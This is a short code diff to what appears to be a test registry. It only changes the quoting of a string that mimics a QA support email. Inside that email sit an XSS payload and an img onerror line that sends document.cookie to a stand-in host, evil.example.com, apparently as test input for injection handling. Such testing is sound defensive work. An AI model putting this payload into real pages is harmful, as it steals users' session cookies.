@@ -8047,8 +8047,8 @@ default_registry.register(
                 "Here is the error from the console before it "
                 "crashes:\n"
                 '<script>alert("XSS")</script>\n'
-                '<img src=x onerror="document.location=\'https://'
-                'evil.example.com/steal?c=\'+document.cookie">\n'
+                "<img src=x onerror=\"document.location='https://"
+                "evil.example.com/steal?c='+document.cookie\">\n"
                 "TypeError: Cannot read properties of undefined\n\n"
                 "Please advise.\n\n"
                 "Thanks,\nJordan Lee\nQA"
